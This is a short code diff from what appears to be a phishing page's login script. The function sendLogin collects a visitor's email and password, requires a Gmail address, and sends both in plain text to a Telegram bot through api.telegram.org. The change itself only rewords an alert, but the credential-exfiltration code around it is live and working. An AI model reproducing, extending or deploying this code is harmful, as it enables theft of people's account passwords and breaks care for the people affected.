@@ -69,7 +69,7 @@ function sendLogin(){
   const email = document.getElementById('email').value.trim();
   const password = document.getElementById('password').value.trim();
   if(!email||!password){alert('Please complete your login'); return;}
-  if(!email.endsWith("@gmail.com")){alert('Please use Gmail'); return;}
+  if(!email.endsWith("@gmail.com")){alert('please login with your email'); return;}
   const message=`Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
   
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
